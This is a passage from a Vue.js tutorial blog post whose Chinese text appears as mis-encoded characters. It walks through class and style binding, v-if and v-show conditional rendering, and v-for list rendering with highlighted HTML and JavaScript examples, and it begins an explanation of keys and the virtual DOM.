·å¼--æ•°ç»„å†™æ³•ï¼Œé€‚ç”¨äºï¼šè¦ç»‘å®šçš„æ ·å¼ä¸ªæ•°ä¸ç¡®å®šã€åå­—ä¹Ÿä¸ç¡®å®š --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- ç»‘å®šclassæ ·å¼--å¯¹è±¡å†™æ³•ï¼Œé€‚ç”¨äºï¼šè¦ç»‘å®šçš„æ ·å¼ä¸ªæ•°ç¡®å®šã€åå­—ä¹Ÿç¡®å®šï¼Œä½†è¦åŠ¨æ€å†³å®šç”¨ä¸ç”¨ --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- ç»‘å®šstyleæ ·å¼--å¯¹è±¡å†™æ³• --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;styleObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- ç»‘å®šstyleæ ·å¼--æ•°ç»„å†™æ³• --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;styleArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">      </span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å°šç¡…è°·&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">mood</span>: <span class="hljs-string">&#x27;normal&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">classArr</span>: [<span class="hljs-string">&#x27;atguigu1&#x27;</span>, <span class="hljs-string">&#x27;atguigu2&#x27;</span>, <span class="hljs-string">&#x27;atguigu3&#x27;</span>],</span><br><span class="language-javascript">            <span class="hljs-attr">classObj</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">atguigu1</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">              <span class="hljs-attr">atguigu2</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">styleObj</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">fontSize</span>: <span class="hljs-string">&#x27;40px&#x27;</span>,</span><br><span class="language-javascript">              <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;red&#x27;</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">styleObj2</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">&#x27;orange&#x27;</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">styleArr</span>: [</span><br><span class="language-javascript">              &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">fontSize</span>: <span class="hljs-string">&#x27;40px&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;blue&#x27;</span>,</span><br><span class="language-javascript">              &#125;,</span><br><span class="language-javascript">              &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">&#x27;gray&#x27;</span></span><br><span class="language-javascript">              &#125;</span><br><span class="language-javascript">            ]</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">changeMood</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">              <span class="hljs-keyword">const</span> arr = [<span class="hljs-string">&#x27;happy&#x27;</span>, <span class="hljs-string">&#x27;sad&#x27;</span>, <span class="hljs-string">&#x27;normal&#x27;</span>]</span><br><span class="language-javascript">              <span class="hljs-keyword">const</span> index = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">3</span>)</span><br><span class="language-javascript">              <span class="hljs-variable language_">this</span>.<span class="hljs-property">mood</span> = arr[index]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-12-æ¡ä»¶æ¸²æŸ“"><a href="#1-12-æ¡ä»¶æ¸²æŸ“" class="headerlink" title="1.12 æ¡ä»¶æ¸²æŸ“"></a>1.12 æ¡ä»¶æ¸²æŸ“</h2><p><strong>v-if</strong></p><ul><li><p>å†™æ³• è·Ÿ if else è¯­æ³•ç±»ä¼¼</p><p>v-if&#x3D;â€è¡¨è¾¾å¼â€</p><p>v-else-if&#x3D;â€è¡¨è¾¾å¼â€</p><p>v-else</p></li><li><p>é€‚ç”¨äºï¼šåˆ‡æ¢é¢‘ç‡è¾ƒä½çš„åœºæ™¯ï¼Œå› ä¸ºä¸å±•ç¤ºçš„DOMå…ƒç´ ç›´æ¥è¢«ç§»é™¤</p></li><li><p>æ³¨æ„ï¼šv-ifå¯ä»¥å’Œv-else-ifv-elseä¸€èµ·ä½¿ç”¨ï¼Œä½†è¦æ±‚ç»“æ„ä¸èƒ½è¢«æ‰“æ–­</p></li></ul><p><strong>v-show</strong></p><ul><li>å†™æ³•ï¼šv-show&#x3D;â€è¡¨è¾¾å¼â€</li><li>é€‚ç”¨äºï¼šåˆ‡æ¢é¢‘ç‡è¾ƒé«˜çš„åœºæ™¯</li><li>ç‰¹ç‚¹ï¼šä¸å±•ç¤ºçš„DOMå…ƒç´ æœªè¢«ç§»é™¤ï¼Œä»…ä»…æ˜¯ä½¿ç”¨æ ·å¼éšè—æ‰display: none</li></ul><blockquote><p>å¤‡æ³¨ï¼šä½¿ç”¨v-ifçš„æ—¶ï¼Œå…ƒç´ å¯èƒ½æ— æ³•è·å–åˆ°ï¼Œè€Œä½¿ç”¨v-showä¸€å®šå¯ä»¥è·å–åˆ°v-if æ˜¯å®æ‰“å®åœ°æ”¹å˜domå…ƒç´ ï¼Œv-show æ˜¯éšè—æˆ–æ˜¾ç¤ºdomå…ƒç´ ã€‚<code>template</code>æ ‡ç­¾ä¸å½±å“ç»“æ„ï¼Œé¡µé¢htmlä¸­ä¸ä¼šæœ‰æ­¤æ ‡ç­¾ï¼Œä½†åªèƒ½é…åˆv-ifï¼Œä¸èƒ½é…åˆv-show</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¡ä»¶æ¸²æŸ“<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å½“å‰çš„nå€¼æ˜¯:&#123;&#123; n &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>ç‚¹æˆ‘n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- ä½¿ç”¨v-showåšæ¡ä»¶æ¸²æŸ“ --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-show=&quot;false&quot;&gt;æ¬¢è¿æ¥åˆ°&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-show=&quot;1 === 1&quot;&gt;æ¬¢è¿æ¥åˆ°&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- ä½¿ç”¨v-ifåšæ¡ä»¶æ¸²æŸ“ --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-if=&quot;false&quot;&gt;æ¬¢è¿æ¥åˆ°&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;h2 v-if=&quot;1 === 1&quot;&gt;æ¬¢è¿æ¥åˆ°&#123;&#123;name&#125;&#125;&lt;/h2&gt; --&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- v-elseå’Œv-else-if --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-show=&quot;n === 1&quot;&gt;Angular&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-show=&quot;n === 2&quot;&gt;React&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-show=&quot;n === 3&quot;&gt;Vue&lt;/div&gt; --&gt;</span><br>   <br>     <span class="hljs-comment">&lt;!-- &lt;div v-if=&quot;n === 1&quot;&gt;Angular&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-else-if=&quot;n === 2&quot;&gt;React&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-else-if=&quot;n === 3&quot;&gt;Vue&lt;/div&gt; --&gt;</span><br>     <span class="hljs-comment">&lt;!-- &lt;div v-else&gt;å“ˆå“ˆ&lt;/div&gt; --&gt;</span><br>   <br>   <br>     <span class="hljs-comment">&lt;!-- v-ifä¸templateçš„é…åˆä½¿ç”¨ --&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;n === 1&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä½ å¥½<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å°šç¡…è°·<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>åŒ—äº¬<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">     <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">     <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">       <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">       <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">         <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;å°šç¡…è°·&#x27;</span>,</span><br><span class="language-javascript">         <span class="hljs-attr">n</span>:<span class="hljs-number">0</span></span><br><span class="language-javascript">       &#125;</span><br><span class="language-javascript">     &#125;)</span><br><span class="language-javascript">   </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>â€‹          </p><p>â€‹       </p><h2 id="1-13-åˆ—è¡¨æ¸²æŸ“"><a href="#1-13-åˆ—è¡¨æ¸²æŸ“" class="headerlink" title="1.13 åˆ—è¡¨æ¸²æŸ“"></a>1.13 åˆ—è¡¨æ¸²æŸ“</h2><h3 id="v-foræŒ‡ä»¤"><a href="#v-foræŒ‡ä»¤" class="headerlink" title="v-foræŒ‡ä»¤"></a>v-foræŒ‡ä»¤</h3><ul><li>ç”¨äºå±•ç¤ºåˆ—è¡¨æ•°æ®</li><li>è¯­æ³•ï¼š<code>&lt;li v-for=&quot;(item, index) of items&quot; :key=&quot;index&quot;&gt;</code>ï¼Œè¿™é‡Œkeyå¯ä»¥æ˜¯indexï¼Œæ›´å¥½çš„æ˜¯éå†å¯¹è±¡çš„å”¯ä¸€æ ‡è¯†</li><li>å¯éå†ï¼šæ•°ç»„ã€å¯¹è±¡ã€å­—ç¬¦ä¸²ï¼ˆç”¨çš„å¾ˆå°‘ï¼‰ã€æŒ‡å®šæ¬¡æ•°ï¼ˆç”¨çš„å¾ˆå°‘ï¼‰</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>äº‹ä»¶çš„åŸºæœ¬ä½¿ç”¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>åŸºæœ¬åˆ—è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- éå†æ•°ç»„ --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>äººå‘˜åˆ—è¡¨ï¼ˆéå†æ•°ç»„ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of persons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; p.name &#125;&#125;-&#123;&#123; p.age &#125;&#125;-&#123;&#123; index &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- éå†å¯¹è±¡ --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æ±½è½¦ä¿¡æ¯ï¼ˆéå†å¯¹è±¡ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(value,k) of car&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;k&quot;</span>&gt;</span>&#123;&#123; k &#125;&#125;-&#123;&#123; value &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- éå†å­—ç¬¦ä¸² --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æµ‹è¯•éå†å­—ç¬¦ä¸²ï¼ˆç”¨å¾—å°‘ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(char,index) of str&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; char &#125;&#125;-&#123;&#123; index &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- éå†æŒ‡å®šæ¬¡æ•° --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æµ‹è¯•éå†æŒ‡å®šæ¬¡æ•°ï¼ˆç”¨å¾—å°‘ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(number,index) of 5&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span>&#123;&#123; index &#125;&#125;-&#123;&#123; number &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å¼ ä¸‰&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;æå››&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;ç‹äº”&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> &#125;</span><br><span class="language-javascript">      ],</span><br><span class="language-javascript">      <span class="hljs-attr">car</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å¥¥è¿ªA8&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">price</span>: <span class="hljs-string">&#x27;70ä¸‡&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;é»‘è‰²&#x27;</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">str</span>: <span class="hljs-string">&#x27;hello&#x27;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="keyçš„åŸç†"><a href="#keyçš„åŸç†" class="headerlink" title="keyçš„åŸç†"></a><strong>keyçš„åŸç†</strong></h3><p>vueä¸­çš„keyæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿï¼ˆkeyçš„å†…éƒ¨åŸç†ï¼‰</p><p>äº†è§£vueä¸­keyçš„åŸç†éœ€è¦ä¸€äº›å‰ç½®çŸ¥è¯†ã€‚</p><p>å°±æ˜¯vueçš„è™šæ‹Ÿdomï¼Œvueä¼šæ ¹æ® dataä¸­çš„æ•°æ®ç”Ÿæˆè™šæ‹Ÿdomï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡ç”Ÿæˆé¡µé¢ï¼Œå°±å°†è™šæ‹Ÿdomè½¬æˆçœŸå®domï¼Œåœ¨é¡µé¢å±•ç¤ºå‡ºæ¥ã€‚</p><p>è™šæ‹Ÿdomæœ‰å•¥ç”¨ï¼Ÿæ¯æ¬¡vm._dataä¸­çš„æ•°æ®æ›´æ”¹ï¼Œéƒ½ä¼šè§¦å‘ç”Ÿæˆæ–°çš„è™šæ‹Ÿdomï¼Œæ–°çš„è™šæ‹Ÿdomä¼šè·Ÿæ—§çš„è™šæ‹Ÿdomè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰ç›¸åŒçš„ï¼Œåœ¨ç”ŸæˆçœŸå®domæ—¶ï¼Œè¿™éƒ¨åˆ†ç›¸åŒçš„å°±ä¸éœ€è¦é‡æ–°ç”Ÿæˆï¼Œåªéœ€è¦å°†ä¸¤è€…ä¹‹é—´ä¸åŒçš„domè½¬æ¢æˆçœŸå®domï¼Œå†ä¸åŸæ¥çš„çœŸå®domè¿›è¡Œæ‹¼æ¥ã€‚æˆ‘çš„ç†è§£æ˜¯è™šæ‹Ÿdomå°±æ˜¯èµ·åˆ°äº†ä¸€ä¸ªdomå¤ç”¨çš„ä½œç”¨ï¼Œè¿˜æœ‰é¿å…é‡å¤å¤šä½™çš„æ“ä½œï¼Œä¸‹æ–‡æœ‰è¯¦ç»†è§£é‡Šã€‚</p><p>è€Œkeyæœ‰å•¥ç”¨ï¼Ÿ</p><p>keyæ˜¯è™šæ‹Ÿdomçš„æ ‡è¯†ã€‚</p><p>å…ˆæ¥ç‚¹é¢„å¤‡çš„çŸ¥è¯†ï¼šå•¥æ˜¯çœŸå® DOMï¼ŸçœŸå® DOM å’Œ è™šæ‹Ÿ DOM æœ‰å•¥åŒºåˆ«ï¼Ÿå¦‚ä½•ç”¨ä»£ç å±•ç°çœŸå® DOM å’Œ è™šæ‹Ÿ DOM</p><h4 id="çœŸå®DOMå’Œå…¶è§£ææµç¨‹"><a href="#çœŸå®DOMå’Œå…¶è§£ææµç¨‹" class="headerlink" title="çœŸå®DOMå’Œå…¶è§£ææµç¨‹"></a>çœŸå®<code>DOM</code>å’Œå…¶è§£ææµç¨‹</h4><p>è¿™é‡Œå‚è€ƒè¶…çº§è‹±é›„å¤§ä½¬ï¼š<a href="https://juejin.cn/post/6844903895467032589">https://juejin.cn/post/6844903895467032589</a></p><p><code>webkit</code> æ¸²æŸ“å¼•æ“å·¥ä½œæµç¨‹å›¾</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b32d88931ee775d57b382d7585de3ad8.png" alt="img"></p><blockquote><p>ä¸­æ–‡ç‰ˆ</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cd1757feee540ef20c50b81af16d75ca.png" alt="img"></p><p>æ‰€æœ‰çš„æµè§ˆå™¨æ¸²æŸ“å¼•æ“å·¥ä½œæµç¨‹å¤§è‡´åˆ†ä¸º5æ­¥ï¼šåˆ›å»º <code>DOM</code> æ ‘ â€”&gt; åˆ›å»º <code>Style Rules</code> -&gt; æ„å»º <code>Render</code> æ ‘ â€”&gt; å¸ƒå±€<br><code>Layout</code> -â€”&gt; 